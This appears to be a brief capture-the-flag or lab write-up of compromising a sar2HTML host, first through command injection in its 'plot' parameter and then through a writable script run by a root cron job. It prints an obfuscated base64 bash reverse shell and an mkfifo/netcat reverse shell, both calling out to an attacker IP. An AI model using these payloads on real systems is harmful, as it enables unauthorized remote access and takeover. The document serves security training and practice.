#### Recap
The scan identified SSH and HTTP. The robots file contained the value sar2HTML.
The value led to an application directory rather than a credential. The plot parameter exposed command injection.
```bash
curl "http://ip/sar2HTML/index.php?plot=;echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIyNS85MDAxIDA%2bJjEK+|base64+-d|bash"
``` 
The application flaw yielded execution as www-data and the first flag.

SUID pkexec was one viable root path. The system logs provided no additional lead, but crontab showed a root job running every five minutes from the web directory.
```bash
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```
The scheduled script called a second script writable by the web account. That dependency exposed privileged execution.
```bash
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.225 4444 > /tmp/f
```
A subsequent scheduled run yielded root access and the second flag.
